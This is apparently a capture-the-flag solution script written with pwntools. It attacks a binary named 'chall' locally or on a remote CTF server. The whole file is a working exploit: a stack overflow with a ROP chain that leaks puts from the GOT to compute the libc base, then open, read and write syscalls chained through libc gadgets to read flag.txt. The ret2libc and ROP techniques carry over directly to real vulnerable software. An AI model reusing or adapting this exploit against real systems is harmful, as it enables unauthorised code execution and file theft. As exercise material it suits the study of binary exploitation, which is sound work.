#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('chall.nitdgplug.org', 30104)

    p = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def gen_syscall(rax, rdi, rsi, rdx):
    payload = b''
    payload += p64(pop_rax)
    payload += p64(rax)
    payload += p64(pop_rsi)
    payload += p64(rsi)
    payload += p64(pop_rdi)
    payload += p64(rdi)
    payload += p64(pop_rdx)
    payload += p64(rdx)
    payload += p64(syscall)

    return payload

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 24
binary = ELF(exe)
rop = ROP(exe)
generator = cyclic_gen()
payload = generator.get(offset)
io.sendline(payload)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address
entry = 0x00401114
# main = 0x00401311
main = 0x0040131d
puts_offset = 0x06f6a0
read_offset = 0x0f7310
open_offset = 0x0f70f0
write_offset = 0x0f7370
bomb = 0x004040a0

################################################################################
# leak libc
################################################################################
log.info('Stage 1. leak libc')

payload = p64(bomb) * 3
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.sym.puts)
payload += p64(ret)
payload += p64(main)

io.sendlineafter('chance:\n', payload)
leak = io.recvline()[:-1]
puts_leak = u64(leak.ljust(8, b'\0'))
libc = ELF('./libc.so.6') if args.REMOTE else ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_leak - libc.sym.puts
log.success('Got leak: @puts=0x{:2x}'.format(puts_leak))
libc.address = libc_base
log.success('Got libc base: 0x{:2x}'.format(libc_base))

payload = b'flag.txt\x00' + generator.get(offset)
io.sendline(payload)

libc_rop = ROP(libc)
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = libc_rop.find_gadget(['pop rdx', 'ret']).address
mov_rax = 0x00401343
pop_rax = libc_rop.find_gadget(['pop rax', 'ret']).address
syscall = libc_rop.find_gadget(['syscall', 'ret']).address

payload = generator.get(15) + b'flag.txt\x00'
payload += gen_syscall(0x2, bomb-1, 0x0, 0x0)
payload += gen_syscall(0x0, 0x3, bomb, 0x30)
payload += gen_syscall(0x1, 0x1, bomb, 0x30)

io.sendlineafter('chance:\n', payload)
flag = io.recv(1024)
flag = flag[:flag.index(b'}')+1]
log.success('Got flag: {}'.format(flag))
